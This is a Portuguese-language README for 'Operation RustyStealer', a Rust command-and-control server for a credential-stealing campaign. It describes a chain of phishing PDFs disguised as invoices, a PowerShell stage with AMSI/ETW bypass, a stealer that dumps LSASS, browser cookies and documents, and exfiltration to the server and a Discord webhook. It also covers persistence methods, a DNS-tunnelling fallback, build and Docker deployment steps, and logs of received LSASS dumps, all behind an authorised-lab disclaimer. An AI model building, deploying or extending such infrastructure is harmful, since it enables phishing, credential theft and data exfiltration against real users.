# GhostInject - Red Team Operation

Documentação Técnica Completa

## 📋 Índice
* Visão Geral
* Arquitetura do Sistema
* Pré-requisitos
* Instalação e Configuração
* Estrutura do Projeto
* Configuração do Ambiente
* Executando o Servidor
* Endpoints da API
* Dashboard Web
* Segurança e Hardening
* Monitoramento e Logs
* Troubleshooting
* Roadmap
* Suporte e Contato
* Aviso Legal
* Licença

---

## 🎯 Visão Geral

**Operation RustyStealer** é um sistema C2 (Command & Control) desenvolvido em Rust para operações de Red Team em ambiente de laboratório autorizado. O sistema permite gerenciar múltiplos alvos, coletar dados exfiltrados e manter comunicação persistente com os agentes implantados.

### Características Principais

| Característica | Descrição |
| :--- | :--- |
| **Alta Performance** | Escrito em Rust com `tokio` async, suporta centenas de conexões simultâneas |
| **Armazenamento Seguro** | SQLite com dados criptografados em repouso |
| **Múltiplos Payloads** | Suporte a diferentes estágios de ataque (`stager`, `stealer`, `persistence`) |
| **Dashboard Web** | Interface web para monitoramento em tempo real |
| **Notificações** | Alertas via Discord webhook para eventos críticos |
| **Logging Estruturado** | Logs detalhados para análise forense |

---

```text
┌─────────────────────────────────────────────────────────────────┐
│                   1. VETOR DE ENTREGA                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  📧 Phishing e-mail com PDF anexo                                │
│  📱 WhatsApp com PDF disfarçado (fatura, boleto, contrato)       │
│  🌐 Smart Click — página falsa que força download do PDF         │
│                                                                   │
│  O PDF contém:                                                    │
│  ├─ Macro maliciosa (se for PDF com macro)                       │
│  ├─ JavaScript exploit (CVE-2018-4990, CVE-2020-0601, etc.)     │
│  └─ Ou simplesmente instrução pra abrir e "executar"             │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   2. EXECUÇÃO INVISÍVEL                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Ao abrir o PDF:                                                 │
│  ├─ Macro executa silenciosamente (sem alerta)                   │
│  ├─ Ou exploit de JavaScript baixa o payload em memória          │
│  └─ Ou PDF chama PowerShell com one-liner                        │
│                                                                   │
│  O que executa:                                                  │
│  └─ stage1.ps1 (AMSI/ETW bypass + download do stealer.exe)      │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   3. STEALER (Rust)                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  stealer.exe (compilado com as flags de release):                │
│  ├─ Anti-debug + sandbox detection                               │
│  ├─ Dump LSASS (credenciais)                                    │
│  ├─ Extrai cookies/creds dos navegadores                        │
│  ├─ Coleta documentos sensíveis                                  │
│  ├─ Criptografa (AES) e envia pro C2                            │
│  └─ Envia backup via Discord webhook                            │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   4. C2 E PERSISTÊNCIA                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  C2 Server (Rust/Axum):                                         │
│  ├─ Recebe dados via /exfil                                      │
│  ├─ Armazena em SQLite criptografado                            │
│  ├─ Dashboard web pra operador                                   │
│  └─ Notifica Discord                                            │
│                                                                   │
│  Persistência:                                                   │
│  ├─ WMI Event Subscription                                       │
│  ├─ Scheduled Task                                               │
│  └─ Registry Run Keys                                            │
│                                                                   │
│  DNS C2 (fallback):                                              │
│  └─ Se HTTP bloqueado, exfiltra via DNS tunneling               │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```


## 🏗️ Arquitetura do Sistema

```text
┌─────────────────────────────────────────────────────────────┐
│                     C2 Server (Rust)                        │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │
│  │   HTTP API  │  │   SQLite    │  │   Dashboard Web     │ │
│  │  (Axum)     │◄─┤  Database   │  │   (HTML/CSS/JS)     │ │
│  └─────────────┘  └─────────────┘  └─────────────────────┘ │
│         ▲                ▲                    ▲             │
│         │                │                    │             │
│         ▼                ▼                    ▼             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Payload Repository (Static)            │   │
│  │  stage1.ps1 │ stealer.exe │ persistence.ps1        │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
                              │
                              │ HTTPS
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                     Alvos (Providers)                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │
│  │  Windows 10 │  │  Windows 11 │  │  Windows Server     │ │
│  │  (Agent)    │  │  (Agent)    │  │  (Agent)            │ │
│  └─────────────┘  └─────────────┘  └─────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

---

## 📦 Pré-requisitos

### Hardware Recomendado

| Componente | Mínimo | Recomendado |
|------------|--------|-------------|
| CPU | 1 core | 2+ cores |
| RAM | 512 MB | 2 GB |
| Disco | 10 GB | 50 GB+ |

### Software Necessário

| Software | Versão | Comando para verificar |
|----------|--------|------------------------|
| Rust | 1.70+ | `rustc --version` |
| Cargo | 1.70+ | `cargo --version` |
| Git | 2.0+ | `git --version` |
| SQLite | 3.0+ | `sqlite3 --version` |

### Instalação do Rust

```bash
# Linux/macOS
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source "$HOME/.cargo/env"
```

```text
# Windows
Baixe e execute: https://rustup.rs/
```

---

## 🛠️ Instalação e Configuração

### 1. Clonar o Repositório

```bash
git clone https://github.com/your-org/operation-rustystealer.git
cd operation-rustystealer/c2-server
```

### 2. Criar Diretórios Necessários

```text
mkdir -p data/alvos
mkdir -p data/exfils
mkdir -p data/logs
mkdir -p payloads/windows
mkdir -p payloads/linux
mkdir -p static/css
mkdir -p static/js
mkdir -p static/img
```

### 3. Compilar o Stealer

```bash
cd ../lsass_dumper
cargo build --release
strip target/release/lsass_dumper.exe
cp target/release/lsass_dumper.exe ../c2-server/payloads/windows/stealer.exe
ls -la ../c2-server/payloads/windows/stealer.exe
```

### 4. Configurar o Arquivo `config.toml`

```bash
cp config.toml.example config.toml
vim config.toml
```

---

## 📁 Estrutura do Projeto

```text
c2-server/
├── src/
│   ├── main.rs
│   ├── handlers.rs
│   ├── database.rs
│   ├── crypto.rs
│   ├── models.rs
│   ├── config.rs
│   ├── auth.rs
│   ├── logging.rs
│   └── alerts.rs
├── templates/
│   └── dashboard/
│       ├── index.html
│       ├── alvo.html
│       └── login.html
├── static/
│   ├── css/
│   │   └── dashboard.css
│   └── js/
│       └── dashboard.js
├── payloads/
│   ├── windows/
│   │   ├── stealer.exe
│   │   ├── stage1.ps1
│   │   └── persistence.ps1
│   └── linux/
├── data/
│   ├── alvos/
│   ├── exfils/
│   ├── logs/
│   └── c2.db
├── certs/
│   ├── cert.pem
│   └── key.pem
├── scripts/
│   ├── backup.sh
│   ├── cleanup.sh
│   └── monitor.sh
├── Cargo.toml
├── Cargo.lock
├── config.toml
├── config.toml.example
├── README.md
└── .env.example
```

---

## ⚙️ Configuração do Ambiente

### Variáveis de Ambiente

```text
C2_SERVER__HOST=0.0.0.0
C2_SERVER__PORT=8443
C2_AUTH__API_KEY=my-super-secret-key
C2_DATABASE__PATH=./data/c2.db
```

### Certificados TLS

```bash
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem -days 365 -nodes -subj "/CN=localhost"
```

```text
Para produção, use certificados válidos, como Let's Encrypt.
```

---

## 🚀 Executando o Servidor

### Modo Desenvolvimento (HTTP)

```text
cargo run

# ou

cargo build --release
./target/release/c2-server
```

### Modo Produção (HTTPS)

```text
cargo build --release
./target/release/c2-server
```

```text
Configure `tls_enabled = true` no `config.toml`
e garanta que os certificados existam em `certs/`.
```

### Usando Docker

```dockerfile
FROM rust:1.70-slim as builder
WORKDIR /app
COPY . .
RUN cargo build --release

FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY --from=builder /app/target/release/c2-server /app/
COPY --from=builder /app/config.toml /app/
COPY --from=builder /app/payloads /app/payloads/
COPY --from=builder /app/static /app/static/
COPY --from=builder /app/templates /app/templates/
EXPOSE 8443
CMD ["./c2-server"]
```

### Verificar se o Servidor Está Rodando

```bash
curl http://localhost:8443/health
```

```text
Resposta esperada:
{"status":"healthy","timestamp":"2026-03-30T10:00:00Z"}
```

---

## 🔌 Endpoints da API

### Base URL

```text
http://localhost:8443
```

---

## 🖥️ Dashboard Web

```text
O dashboard web permite acompanhar alvos ativos, eventos de exfiltração,
status de beacons e indicadores operacionais em tempo real.
```

---

## 🔒 Segurança e Hardening

### 1. Autenticação JWT

Ative autenticação JWT para o dashboard e API de gerenciamento:

```toml
[auth]
jwt_secret = "YOUR_VERY_STRONG_SECRET_KEY_MIN_32_CHARS"
jwt_expiry_hours = 24
```

### 2. API Key para Agentes

Cada agente usa uma API key fixa configurada no servidor:

```toml
[auth]
api_key = "RANDOM_STRING_AT_LEAST_32_CHARS"
```

### 3. TLS/SSL (HTTPS)

```toml
[server]
tls_enabled = true
cert_file = "./certs/cert.pem"
key_file = "./certs/key.pem"
```

### 4. Rate Limiting

Protege contra brute force e DDoS:

```rust
// Já implementado via tower_http
use tower_http::limit::RequestBodyLimitLayer;
```

### 5. IP Whitelist (Opcional)

```toml
[security]
allowed_ips = ["192.168.1.0/24", "10.0.0.0/8"]
deny_all_others = true
```

### 6. Logs de Auditoria

Todos os acessos são logados:

```text
[2026-03-30 10:23:45] INFO  [ACCESS] IP: 192.168.1.100 | Endpoint: /exfil | Status: 200
[2026-03-30 10:23:46] INFO  [ACCESS] IP: 10.0.0.1 | Endpoint: /dashboard | Status: 200
```

---

## 📈 Monitoramento e Logs

### Logs Estruturados

```bash
# Ver logs em tempo real
tail -f data/logs/c2.log
```

```text
{"timestamp":"2026-03-30T10:23:45Z","level":"INFO","message":"Exfil received","alvo_id":"alvo-001","data_type":"lsass_dump","size":47102400}
```

### Métricas Prometheus (Opcional)

```rust
// Endpoint para métricas
.route("/metrics", get(prometheus_handler))
```

### Health Check Endpoint

```bash
curl http://localhost:8443/health
```

```json
{
  "status": "healthy",
  "version": "0.1.0",
  "uptime_seconds": 3600,
  "database_status": "connected",
  "total_alvos": 4,
  "active_beacons": 3
}
```

---

## 🔧 Troubleshooting

### Problemas Comuns e Soluções

| Problema | Causa Provável | Solução |
|----------|----------------|---------|
| Servidor não sobe | Porta em uso | Mude a porta no `config.toml` ou finalize o processo que usa a porta |
| Erro de banco | Permissão de escrita | Ajuste permissões em `data/` e `data/c2.db` |
| Payload não baixa | Caminho incorreto | Verifique se o arquivo existe em `payloads/windows/stealer.exe` |
| Dashboard não carrega | Templates ausentes | Verifique se `templates/dashboard/index.html` existe |
| Agente não conecta | API Key inválida | Confirme que a API key no `config.toml` é a mesma do agente |
| Exfil muito grande | Limite de payload | Aumente `max_payload_size` no `config.toml` |

### Debug Mode

```bash
RUST_LOG=debug cargo run
```

```toml
[logging]
level = "debug"
```

---

## 🗺️ Roadmap

### Fase 1 (MVP) ✅

* Servidor HTTP básico com Axum
* Endpoint `/exfil` para receber dados
* Endpoint `/beacon` para heartbeats
* Endpoint `/payload` para servir agentes
* Banco SQLite para armazenamento
* Dashboard web básico

### Fase 2 (Atual) 🔄

* Autenticação JWT
* Notificações Discord/Telegram
* Logging estruturado
* Compressão de dados
* Criptografia em repouso

### Fase 3 (Próximo) 📅

* Interface CLI para operador
* Múltiplos tenants
* Integração com Grafana
* Auto-update de payloads
* Suporte a Linux/macOS
* Análise automática de exfils

### Fase 4 (Futuro) 🚀

* WebSocket para comunicação bidirecional
* Pivoting e movimento lateral
* Inteligência artificial para evasão
* Dashboard com mapa mundial
* Relatórios automáticos

---

## 📞 Suporte e Contato

Para questões relacionadas ao projeto em ambiente de laboratório autorizado:

* Documentação técnica: `/docs` no repositório
* Issues: GitHub Issues, apenas para bugs
* Chat interno: Matrix/Slack da equipe de Red Team

---

## ⚠️ Aviso Legal

Este projeto é exclusivamente para fins educacionais e testes de segurança em ambientes autorizados.

O uso deste software para qualquer atividade não autorizada é estritamente proibido. O desenvolvedor não se responsabiliza por uso indevido ou danos causados pelo software.

---

## 📄 Licença

Este projeto está licenciado sob a MIT License. Consulte o arquivo `LICENSE` para mais detalhes.
